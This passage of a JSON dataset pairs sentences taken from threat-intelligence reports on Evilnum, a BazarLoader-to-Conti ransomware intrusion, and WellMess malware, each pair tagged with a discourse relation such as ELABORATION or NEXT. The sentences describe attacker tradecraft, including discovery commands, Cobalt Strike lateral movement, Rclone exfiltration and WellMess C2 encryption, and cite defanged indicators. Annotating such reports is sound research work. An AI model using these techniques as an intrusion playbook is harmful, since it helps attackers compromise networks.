        "S1": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "S2": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "relation": "MISC"
    },
    {
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "relation": "MISC"
    },
    {
        "S1": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "S2": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "relation": "MISC"
    },
    {
        "S1": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "S2": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "relation": "MISC"
    },
    {
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "When we look at our earlier Conti case, this becomes noticeable.",
        "relation": "MISC"
    },
    {
        "S1": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "S2": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "S2": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "relation": "MISC"
    },
    {
        "S1": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "S2": "There are some evident similarities in cases that involve Conti ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This case saw such a conclusion.",
        "S2": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "relation": "MISC"
    },
    {
        "S1": "There are some evident similarities in cases that involve Conti ransomware.",
        "S2": "When we look at our earlier Conti case, this becomes noticeable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "S2": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we look at our earlier Conti case, this becomes noticeable.",
        "S2": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "S2": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "relation": "MISC"
    },
    {
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "relation": "NEXT"
    },
    {
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "relation": "MISC"
    },
    {
        "S1": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "S2": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "relation": "NEXT"
    },
    {
        "S1": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "S2": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "relation": "NEXT"
    },
    {
        "S1": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "S2": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "S2": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "relation": "MISC"
    },
    {
        "S1": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "S2": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "relation": "NEXT"
    },
    {
        "S1": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "S2": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "relation": "MISC"
    },
    {
        "S1": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "S2": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "relation": "MISC"
    },
    {
        "S1": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "S2": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "S2": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "relation": "NEXT"
    },
    {
        "S1": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "S2": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "relation": "MISC"
    },
    {
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "S2": "D8B3.dll injected into the Winlogon process (high integrity):",
        "relation": "MISC"
    },
    {
        "S1": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "S2": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "S2": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "relation": "MISC"
    },
    {
        "S1": "Followed by D8B3.dll:",
        "S2": "In the case of D8B3.dll, the DLL was Go compiled.",
        "relation": "ELABORATION"
    },
    {
        "S1": "D8B3.dll injected into the Winlogon process (high integrity):",
        "S2": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "relation": "NEXT"
    },
    {
        "S1": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.",
        "S2": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "relation": "NEXT"
    },
    {
        "S1": "However, we did not observe many events of interest during these sessions.",
        "S2": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "relation": "MISC"
    },
    {
        "S1": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "S2": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "relation": "MISC"
    },
    {
        "S1": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "S2": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "relation": "MISC"
    },
    {
        "S1": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "S2": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.",
        "relation": "ELABORATION"
    },
    {
        "S1": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "S2": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe",
        "relation": "ELABORATION"
    },
    {
        "S1": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.",
        "S2": "The use of this tool has been observed in other recent intrusions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "S2": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "S2": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "relation": "MISC"
    },
    {
        "S1": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:",
        "S2": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "relation": "MISC"
    },
    {
        "S1": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "S2": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "relation": "MISC"
    },
    {
        "S1": "This was achieved very early in the intrusion, and we were able to correlate the activity:",
        "S2": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": "MISC"
    },
    {
        "S1": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.",
        "S2": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
        "relation": "NEXT"
    },
    {
        "S1": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "S2": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "relation": "MISC"
    },
    {
        "S1": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "S2": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "relation": "MISC"
    },
    {
        "S1": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "S2": "Here\u2019s an overview of the execution:",
        "relation": "MISC"
    },
    {
        "S1": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "S2": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "S2": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They first pinged systems across the network via an interactive command shell.",
        "S2": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "S2": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "S2": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:",
        "relation": "MISC"
    },
    {
        "S1": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "S2": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "relation": "MISC"
    },
    {
        "S1": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": "NEXT"
    },
    {
        "S1": "Here\u2019s an overview of the execution:",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": "NEXT"
    },
    {
        "S1": "The WellMess sample we examine in this insight is written in Go, though .NET WellMess samples also exist.",
        "S2": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "S2": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "relation": "MISC"
    },
    {
        "S1": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "S2": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "S2": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "S2": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "relation": "MISC"
    },
    {
        "S1": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "S2": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "S2": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "S2": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "S2": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "relation": "MISC"
    },
    {
        "S1": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": "MISC"
    },
    {
        "S1": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "S2": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": "MISC"
    },
    {
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "relation": "NEXT"
    },
    {
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "relation": "MISC"
    },
    {
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:",
        "S2": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "S2": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "relation": "MISC"
    },
    {
        "S1": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "S2": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "relation": "NEXT"
    },
    {
        "S1": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "S2": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "relation": "MISC"
    },
    {
        "S1": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "S2": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "S2": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "S2": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "relation": "NEXT"
    },
    {
        "S1": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "S2": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "relation": "NEXT"
    },
    {
        "S1": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "S2": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "relation": "NEXT"
    },
    {
        "S1": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "S2": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "relation": "NEXT"
    },
    {
        "S1": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "S2": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "S2": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "S2": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "S2": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "relation": "MISC"
    },
    {
        "S1": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "S2": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "S2": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "S2": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "S2": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "relation": "NEXT"
    },
    {
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "relation": "MISC"
    },
    {
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "relation": "MISC"
    },
    {
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "relation": "NEXT"
    },
    {
        "S1": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": "LIST"
    },
    {
        "S1": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "S2": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "relation": "MISC"
    },
    {
        "S1": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": "MISC"
    },
    {
        "S1": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "S2": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "relation": "MISC"
    },
    {
        "S1": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "S2": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "relation": "MISC"
    },
    {
        "S1": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "S2": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "S2": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "S2": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "S2": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "relation": "MISC"
    },
    {
        "S1": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "S2": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "S2": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "S2": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "relation": "MISC"
    },
    {
